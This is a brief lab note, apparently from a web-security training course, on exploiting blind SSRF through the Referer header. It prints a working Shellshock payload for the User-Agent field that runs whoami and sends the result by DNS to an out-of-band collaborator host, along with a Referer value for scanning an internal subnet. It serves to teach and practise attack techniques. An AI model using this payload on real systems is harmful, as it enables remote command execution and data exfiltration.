@@ -1,0 +1,13 @@
+Lab #7 - Blind SSRF with Shellshock exploitation
+
+Vulnerable parameter - Referer header
+
+Goal - use this functionality to perform a blind SSRF attack against an internal server in the 192.168.0.X range on port 8080. In the blind attack, use a Shellshock payload against the internal server to exfiltrate the name of the OS user. 
+
+Analysis:
+
+efxu0y6ca4wvwl5lf5lw9gkwenkd82.oastify.com
+
+shellshock exploit: () { :; }; /usr/bin/nslookup $(whoami).efxu0y6ca4wvwl5lf5lw9gkwenkd82.oastify.com        -> Put it in 'user agent' field
+
+referer header: http://192.168.0.$1:8080/        -> Iterate using intruder from 1 to 255
